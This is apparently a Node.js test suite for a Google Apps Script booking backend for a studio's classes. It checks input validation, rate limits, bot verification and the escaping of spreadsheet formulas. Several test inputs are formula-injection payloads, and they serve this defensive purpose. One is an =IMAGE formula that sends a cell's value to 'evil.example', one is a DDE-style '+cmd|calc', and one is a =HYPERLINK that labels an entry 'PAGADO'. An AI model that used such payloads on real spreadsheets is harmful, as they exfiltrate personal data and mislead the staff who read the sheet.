// Pruebas de apps-script/Code.gs con mocks (node tests/gs-tests.js). Escribe tests/gs-results.txt.
const { mk, proxima, sumarDias } = require('./gs-harness');
const fs = require('fs');
const LUN = proxima('lunes'), LUN2 = proxima('lunes', 1), LUN3 = proxima('lunes', 2), SAB = proxima('sábado'), MAR = proxima('martes');
const base = { accion: 'reservar', claseId: 'ETR-001', fecha: LUN, modalidad: 'suelta', plan: '', nombre: 'Ana Test', whatsapp: '11 2345 6789', adulto: '', web: '', consentimientoMedicion: 'No', acepto: true };
const out = []; let pass = 0, fail = 0;
const FORMULA = /^[=+\-@\t\r]/;
function celdasPeligrosas(row) { return row.filter(v => typeof v === 'string' && FORMULA.test(v)); }
function t(nombre, fn) {
  try { const r = fn(); if (r === true) { pass++; out.push('PASS  ' + nombre); } else { fail++; out.push('FAIL  ' + nombre + '  → ' + JSON.stringify(r)); } }
  catch (e) { fail++; out.push('FAIL  ' + nombre + '  → excepción ' + e.stack); }
}
const ok = (cond, info) => (cond ? true : info);

t('01 reserva válida (suelta, Pole lunes) → ok, código RES-XXXXXX, precio del servidor, 30 columnas', () => {
  const s = mk(); const r = s.post({ ...base, precio: 1 }); const f = s.reservas()[0];
  return ok(r.ok && /^RES-[0-9A-F]{6}$/.test(r.codigo) && f && f[13] === 20000 && f.length === 30 && f[1] === 'ETR-001|' + LUN && f[28] && f[29] === '2026-11-10' && celdasPeligrosas(f).length === 0, { r, f });
});
t('02 nombre con fórmula =HYPERLINK → se guarda como texto con \' adelante', () => {
  const s = mk(); const r = s.post({ ...base, nombre: '=HYPERLINK("https://e.vil";"PAGADO")' }); const f = s.reservas()[0];
  return ok(r.ok && f[3] === '\'=HYPERLINK("https://e.vil";"PAGADO")' && celdasPeligrosas(f).length === 0, { r, f3: f && f[3] });
});
t('03 adulto con fórmula (+cmd|calc) en Acro infantil → escapado', () => {
  const s = mk(); const r = s.post({ ...base, claseId: 'ETR-020', fecha: SAB, modalidad: 'prueba', adulto: '+cmd|calc' }); const f = s.reservas()[0];
  return ok(r.ok && f[5] === "'+cmd|calc" && celdasPeligrosas(f).length === 0, { r, f5: f && f[5] });
});
t('04 fbp/fbc/url/ua con fórmulas y consentimiento Sí → todo escapado', () => {
  const s = mk(); const r = s.post({ ...base, consentimientoMedicion: 'Sí', fbp: '=1+1', fbc: '@SUM(1)', url: '-2+3', ua: '\t=HYPERLINK("x")' }); const f = s.reservas()[0];
  return ok(r.ok && f[23] === "'=1+1" && f[24] === "'@SUM(1)" && f[25] === "'-2+3" && f[26].charAt(0) === "'" && celdasPeligrosas(f).length === 0, { r, f: f && f.slice(23, 27) });
});
t('05 plan con fórmula =IMAGE() (modalidad mes) → Plan inválido, sin fila', () => {
  const s = mk(); const r = s.post({ ...base, modalidad: 'mes', plan: '=IMAGE("https://evil.example/x?"&D2)' });
  return ok(!r.ok && r.error === 'Plan inválido.' && s.reservas().length === 0, r);
});
t('06 fecha "+002026-11-16" (año extendido) → Fecha inválida', () => { const s = mk(); const r = s.post({ ...base, fecha: '+00' + LUN }); return ok(!r.ok && r.error === 'Fecha inválida.' && !s.reservas().length, r); });
t('07 fecha 2099-11-16 → fuera de rango', () => { const s = mk(); const r = s.post({ ...base, fecha: '2099-11-16' }); return ok(!r.ok && /60 días/.test(r.error) && !s.reservas().length, r); });
t('08 fecha a 61 días → fuera de rango; a 0 días pasada la hora → rechazada', () => { const s = mk(); const r = s.post({ ...base, fecha: sumarDias(61) }); const r2 = s.post({ ...base, fecha: sumarDias(-1) }); return ok(!r.ok && !r2.ok && !s.reservas().length, [r, r2]); });
t('09 fechas no reales o con formato raro (2026-02-30, "2026-11-16 ", 2026-11-16T19:00, =2026-11-16, número) → rechazadas', () => {
  const s = mk(); const rs = ['2026-02-30', LUN + ' ', LUN + 'T19:00:00-03:00', '=' + LUN, '-' + LUN, 20261116, null].map(f => s.post({ ...base, fecha: f }));
  return ok(rs.every(r => !r.ok) && !s.reservas().length, rs);
});
t('10 día de la semana que no coincide con la clase → Fecha inválida', () => { const s = mk(); const r = s.post({ ...base, fecha: MAR }); return ok(!r.ok && r.error === 'Fecha inválida.', r); });
t('11 body null / "" / array / número / JSON inválido → JSON de error genérico, sin excepción', () => {
  const s = mk(); const rs = ['null', '', '[]', '42', '"x"', '{no json', 'true'].map(b => s.post(b));
  return ok(rs.every(r => r.ok === false && r.error === 'Datos inválidos.' && !('stack' in r)) && !s.reservas().length, rs);
});
t('12 postData ausente → JSON de error, sin excepción', () => { const s = mk(); const r = JSON.parse(s.ctx.doPost({}).t); const r2 = JSON.parse(s.ctx.doPost(undefined).t); return ok(!r.ok && !r2.ok, [r, r2]); });
t('13 body de 5 KB → rechazado antes de parsear', () => { const s = mk(); const r = s.post({ ...base, nombre: 'A'.repeat(5 * 1024) }); return ok(!r.ok && r.error === 'Datos inválidos.' && !s.reservas().length, r); });
t('13b body de 10 KB (nombre =HYPERLINK repetido) → rechazado, sin fila', () => { const s = mk(); const r = s.post({ ...base, nombre: '=HYPERLINK("https://e.vil";"PAGADO")'.repeat(300) }); return ok(!r.ok && r.error === 'Datos inválidos.' && !s.reservas().length, r); });
t('13c honeypot + duplicado + plan inventado + 2099 + +002026 en ráfaga → 1 sola fila (la válida)', () => {
  const s = mk(); const rs = [s.post(base), s.post({ ...base, whatsapp: '+54 9 11 2345-6789' }), s.post({ ...base, web: 'x' }), s.post({ ...base, modalidad: 'mes', plan: 'Plan inventado' }), s.post({ ...base, fecha: '2099-11-16' }), s.post({ ...base, fecha: '+00' + LUN })];
  return ok(rs[0].ok && !rs[1].ok && rs[2].ok && !rs[3].ok && !rs[4].ok && !rs[5].ok && s.reservas().length === 1, rs);
});
t('14 plan objeto / array / 2 MB → rechazado', () => { const s = mk(); const rs = [{ a: 1 }, ['=1+1'], 'A'.repeat(2 * 1024 * 1024)].map(p => s.post({ ...base, modalidad: 'mes', plan: p })); return ok(rs.every(r => !r.ok) && !s.reservas().length, rs); });
t('15 plan inexistente → Plan inválido; plan válido → precio de la planilla y plan de la planilla', () => {
  const s = mk(); const r = s.post({ ...base, modalidad: 'mes', plan: 'Plan inventado' }); const r2 = s.post({ ...base, modalidad: 'mes', plan: '2 veces por semana' }); const f = s.reservas()[0];
  return ok(!r.ok && r2.ok && f[8] === '2 veces por semana' && f[13] === 56000, { r, r2, f: f && [f[8], f[13]] });
});
t('16 clase suelta en disciplina sin precio de suelta (Funcional) → rechazada', () => { const s = mk(); const r = s.post({ ...base, claseId: 'ETR-002', modalidad: 'suelta' }); return ok(!r.ok && !s.reservas().length, r); });
t('17 clase de prueba en clase que NO la ofrece (ETR-099) → rechazada; en una que sí → ok', () => {
  const s = mk(); const r = s.post({ ...base, claseId: 'ETR-099', modalidad: 'prueba' }); const r2 = s.post({ ...base, modalidad: 'prueba' });
  return ok(!r.ok && r.error === 'Esa clase no tiene clase de prueba.' && r2.ok, [r, r2]);
});
t('18 modalidad inválida / claseId con fórmula / claseId objeto → rechazado', () => { const s = mk(); const rs = [{ ...base, modalidad: 'gratis' }, { ...base, claseId: '=1+1' }, { ...base, claseId: { x: 1 } }, { ...base, claseId: 'ETR-404' }].map(b => s.post(b)); return ok(rs.every(r => !r.ok) && !s.reservas().length, rs); });
t('19 nombre: 1 carácter, 61 caracteres, no-string → rechazados; 2 y 60 → ok', () => {
  const s = mk(); const malos = ['A', 'B'.repeat(61), 123, null].map(n => s.post({ ...base, nombre: n }));
  const s2 = mk(); const a = s2.post({ ...base, nombre: 'Al' }); const b = s2.post({ ...base, nombre: 'C'.repeat(60), whatsapp: '1199998888' });
  return ok(malos.every(r => !r.ok) && a.ok && b.ok, { malos, a, b });
});
t('20 WhatsApp: 7 dígitos, 16 dígitos, con letras, con fórmula → rechazados; +54 9 11 → ok y guardado como texto', () => {
  const s = mk(); const malos = ['1234567', '1234567890123456', '11 2345 678a', '=1123456789', 1123456789].map(w => s.post({ ...base, whatsapp: w }));
  const r = s.post({ ...base, whatsapp: '+54 9 11 2345-6789' }); const f = s.reservas()[0];
  return ok(malos.every(x => !x.ok) && r.ok && f[4] === "'+5491123456789", { malos, r, f4: f && f[4] });
});
t('21 sin acepto:true (falta, "true", 1) → rechazado', () => { const s = mk(); const rs = [undefined, 'true', 1].map(a => s.post({ ...base, acepto: a })); return ok(rs.every(r => !r.ok && /aceptar/.test(r.error)) && !s.reservas().length, rs); });
t('22 duplicado mismo WhatsApp (en otro formato) + clase + fecha → rechazado', () => {
  const s = mk(); const a = s.post(base); const b = s.post({ ...base, whatsapp: '+54 9 11 2345 6789' });
  return ok(a.ok && !b.ok && /Ya hay una reserva/.test(b.error) && s.reservas().length === 1, [a, b]);
});
t('23 más de 3 pendientes activas por WhatsApp → la 4ª rechazada (planilla)', () => {
  const s = mk(); const rs = [LUN, LUN2, LUN3].map(f => s.post({ ...base, fecha: f })); s.env.cache.clear(); const r4 = s.post({ ...base, claseId: 'ETR-009', fecha: proxima('miércoles') });
  return ok(rs.every(r => r.ok) && !r4.ok && /pendientes/.test(r4.error) && s.reservas().length === 3, { rs, r4 });
});
t('24 más de 3 pendientes por WhatsApp → la 4ª rechazada (caché, antes del lock)', () => {
  const s = mk(); [LUN, LUN2, LUN3].forEach(f => s.post({ ...base, fecha: f })); s.sheets.Reservas.rows.length = 1; s.env.locked = true; // aunque el lock esté ocupado, corta antes
  const r4 = s.post({ ...base, claseId: 'ETR-009', fecha: proxima('miércoles') });
  return ok(!r4.ok && /pendientes/.test(r4.error), r4);
});
t('25 honeypot web=x → respuesta con el mismo formato que una real, sin escribir y sin tocar contadores', () => {
  const s = mk(); const r = s.post({ ...base, web: 'x' }); const keys = Object.keys(r).sort().join(',');
  const s2 = mk(); const real = s2.post(base);
  return ok(r.ok && /^RES-[0-9A-F]{6}$/.test(r.codigo) && r.estado === 'pendiente' && keys === Object.keys(real).sort().join(',') && s.reservas().length === 0 && s.env.cache.size === 0, { r, real });
});
t('26 tope global por hora (TOPE_RESERVAS_HORA=2) → la 3ª rechazada', () => {
  const s = mk({ props: { TOPE_RESERVAS_HORA: '2' } }); const a = s.post(base); const b = s.post({ ...base, whatsapp: '1100000001' }); const c = s.post({ ...base, whatsapp: '1100000002' });
  return ok(a.ok && b.ok && !c.ok && /muchas reservas/.test(c.error) && s.reservas().length === 2, [a, b, c]);
});
t('27 tope global default = 30', () => { const s = mk(); let n = 0; for (let i = 0; i < 32; i++) if (s.post({ ...base, whatsapp: '11000' + String(10000 + i) }).ok) n++; return ok(n === 30, n); });
t('28 lock ocupado → mensaje de reintento (tryLock corto), sin escribir', () => { const s = mk(); s.env.locked = true; const r = s.post(base); return ok(!r.ok && /unos segundos/.test(r.error) && !s.reservas().length, r); });
t('29 validaciones baratas antes del lock: payload inválido no toca la planilla', () => {
  const s = mk(); s.env.throwOnRead = true; const rs = ['null', JSON.stringify({ ...base, fecha: '2099-01-01' }), JSON.stringify({ ...base, nombre: 'A' }), JSON.stringify({ ...base, web: 'x' })].map(b => s.post(b));
  return ok(rs.every(r => r.error !== 'Error interno'), rs);
});
t('30 error interno (planilla falla) → {ok:false,error:"Error interno"} sin stack ni rutas', () => {
  const s = mk(); s.env.throwOnRead = true; const r = s.post(base); const txt = JSON.stringify(r);
  return ok(!r.ok && r.error === 'Error interno' && !/boom|\.js|at /.test(txt) && s.env.consoleErr.length === 1 && s.env.locked === false, { r, err: s.env.consoleErr });
});
t('31 Turnstile activado (TURNSTILE_SECRET): sin token → rechazado y sin fila', () => { const s = mk({ props: { TURNSTILE_SECRET: 'sec' } }); const r = s.post(base); return ok(!r.ok && /robot/.test(r.error) && !s.reservas().length && s.env.fetches.length === 0, r); });
t('32 Turnstile activado: token válido → verifica en el servidor con secret y token y reserva', () => {
  const s = mk({ props: { TURNSTILE_SECRET: 'sec' } }); const r = s.post({ ...base, turnstile: 'tok' }); const f = s.env.fetches[0];
  return ok(r.ok && f && f.url === 'https://challenges.cloudflare.com/turnstile/v0/siteverify' && f.o.payload.secret === 'sec' && f.o.payload.response === 'tok', { r, f });
});
t('33 Turnstile activado: success=false o hostname ajeno → rechazado', () => {
  const s = mk({ props: { TURNSTILE_SECRET: 'sec' }, fetchResp: { code: 200, body: '{"success":false}' } }); const a = s.post({ ...base, turnstile: 'tok' });
  const s2 = mk({ props: { TURNSTILE_SECRET: 'sec' }, fetchResp: { code: 200, body: '{"success":true,"hostname":"evil.example"}' } }); const b = s2.post({ ...base, turnstile: 'tok' });
  return ok(!a.ok && !b.ok && !s.reservas().length && !s2.reservas().length, [a, b]);
});
t('34 Turnstile desactivado (sin secret) → no llama a Cloudflare', () => { const s = mk(); const r = s.post({ ...base, turnstile: 'x' }); return ok(r.ok && s.env.fetches.length === 0, r); });
t('35 Acro infantil: sin adulto → rechazado; con adulto → ok. Clase no infantil: el adulto se descarta', () => {
  const s = mk(); const a = s.post({ ...base, claseId: 'ETR-020', fecha: SAB, modalidad: 'prueba' }); const b = s.post({ ...base, claseId: 'ETR-020', fecha: SAB, modalidad: 'prueba', adulto: 'Mamá Test' });
  const s2 = mk(); s2.post({ ...base, adulto: 'Alguien' });
  return ok(!a.ok && b.ok && s.reservas()[0][5] === 'Mamá Test' && s2.reservas()[0][5] === '', [a, b]);
});
t('36 cupo: clase completa (cupo 1 con 1 confirmada, fecha como Date en la planilla) → rechazada', () => {
  const s = mk(); const d = new Date(proxima('lunes') + 'T00:00:00-03:00');
  s.sheets.Reservas.rows.push(['RES-OLD', 'ETR-098|' + LUN, new Date(), 'X', '1199990000', '', 'suelta', 'Pole sport', '', 'ETR-098', d, '18:00', 'confirmada', 20000, 10000, 'Sí', '', '', '', '', 'No', 'No']);
  const r = s.post({ ...base, claseId: 'ETR-098' }); return ok(!r.ok && /completa/.test(r.error), r);
});
t('37 confirmación de Ara: fila con fecha "+002026-11-16" → no confirma (alerta) y no sobrevende', () => {
  const s = mk(); s.sheets.Reservas.rows.push(['RES-OLD', 'ETR-098|+00' + LUN, new Date(), 'X', '1199990000', '', 'suelta', 'Pole sport', '', 'ETR-098', '+00' + LUN, '18:00', 'pendiente']);
  s.env.activeRow = 2; s.ctx.confirmarSeleccionada();
  return ok(s.env.alerts.length === 1 && /no es válida/.test(s.env.alerts[0]) && s.sheets.Reservas.rows[1][12] === 'pendiente', s.env.alerts);
});
t('38 confirmación de Ara: cupo lleno con clave normalizada (fecha Date) → alerta «No quedan lugares»', () => {
  const s = mk(); const d = new Date(LUN + 'T00:00:00-03:00');
  s.sheets.Reservas.rows.push(['RES-A', 'x-legacy', new Date(), 'X', '1199990000', '', 'suelta', 'Pole sport', '', 'ETR-098', d, '18:00', 'confirmada']);
  s.sheets.Reservas.rows.push(['RES-B', 'ETR-098|' + LUN, new Date(), 'Y', '1199990001', '', 'suelta', 'Pole sport', '', 'ETR-098', LUN, '18:00', 'pendiente']);
  s.env.activeRow = 3; s.ctx.confirmarSeleccionada();
  return ok(s.env.alerts.some(a => /No quedan lugares/.test(a)) && s.sheets.Reservas.rows[2][12] === 'pendiente', s.env.alerts);
});
t('39 aviso a Meta: el token va en el body, no en la URL', () => {
  const s = mk({ props: { META_CAPI_TOKEN: 'EAAtoken' } }); s.post({ ...base, consentimientoMedicion: 'Sí', fbp: 'fb.1.1.1' });
  s.env.fetchResp = { code: 200, body: '{}' }; s.env.activeRow = 2; s.ctx.confirmarSeleccionada(); const f = s.env.fetches[0];
  return ok(f && !/access_token|EAAtoken/.test(f.url) && JSON.parse(f.o.payload).access_token === 'EAAtoken' && /^enviado/.test(s.sheets.Reservas.rows[1][27]), f);
});
t('40 doGet: acción inválida, sin parámetros y e undefined → JSON; datos → ok sin datos personales', () => {
  const s = mk(); s.post(base); const a = s.get({}); const b = s.get(undefined); const c = s.get({ accion: 'datos' });
  return ok(!a.ok && !b.ok && c.ok && c.clases.length > 0 && !/Ana Test|2345/.test(JSON.stringify(c)), { a, b, keys: Object.keys(c) });
});
t('41 doGet con error interno → "Error interno" sin stack', () => { const s = mk(); s.env.throwOnRead = true; const r = s.get({ accion: 'datos' }); return ok(!r.ok && r.error === 'Error interno', r); });
t('42 celda_(): neutraliza = + - @ tab CR, controles y recorta', () => {
  const c = mk().ctx.celda_;
  const casos = [['=1+1', 10, "'=1+1"], ['+1', 10, "'+1"], ['-1', 10, "'-1"], ['@x', 10, "'@x"], ['\t=1', 10, "'=1"], ['\r1', 10, "'1"], ['  =x', 10, "'=x"], ['a\u0000b\u0007c', 10, 'a b c'], ['abcdef', 3, 'abc'], [null, 5, ''], [123, 5, '123'], ['Ana', 10, 'Ana'], ["'=ya", 10, "'=ya"]];
  const malos = casos.filter(([v, m, e]) => c(v, m) !== e).map(([v, m, e]) => ({ v, e, got: c(v, m) }));
  return ok(malos.length === 0, malos);
});
t('43 ninguna fila escrita en todas las pruebas válidas tiene celdas que Sheets tome como fórmula', () => {
  const s = mk(); s.post({ ...base, nombre: '@Ana', consentimientoMedicion: 'Sí', fbp: '+x', fbc: '-y', url: '=z?q=1', ua: '@ua' });
  return ok(s.env.appended.every(a => celdasPeligrosas(a.row).length === 0) && s.env.appended.length === 1, s.env.appended.map(a => a.row));
});
t('44 vencerPendientes(): marca vencidas las de clase pasada o >48 h', () => {
  const s = mk(); const viejo = new Date(Date.now() - 72 * 3600e3);
  s.sheets.Reservas.rows.push(['RES-1', 'x', new Date(), 'A', '1', '', '', '', '', 'ETR-001', sumarDias(-2), '19:00', 'pendiente']);
  s.sheets.Reservas.rows.push(['RES-2', 'x', viejo, 'B', '1', '', '', '', '', 'ETR-001', LUN, '19:00', 'pendiente']);
  s.sheets.Reservas.rows.push(['RES-3', 'x', new Date(), 'C', '1', '', '', '', '', 'ETR-001', LUN, '19:00', 'pendiente']);
  const n = s.ctx.vencerPendientes(); const est = s.sheets.Reservas.rows.slice(1).map(r => r[12]);
  return ok(n === 2 && est.join() === 'vencida,vencida,pendiente', { n, est });
});
t('45 no usa openById (script vinculado + @OnlyCurrentDoc)', () => { const src = fs.readFileSync(__dirname + '/../apps-script/Code.gs', 'utf8'); return ok(!/openById|SHEET_ID/.test(src) && /^\/\*\* @OnlyCurrentDoc \*\//.test(src), 'openById presente'); });

const resumen = `\nResultado: ${pass} PASS, ${fail} FAIL (fechas de prueba: lunes ${LUN}, sábado ${SAB}; ${new Date().toISOString()})`;
fs.writeFileSync(__dirname + '/gs-results.txt', out.join('\n') + resumen + '\n');
console.log(out.join('\n') + resumen);
process.exit(fail ? 1 : 0);
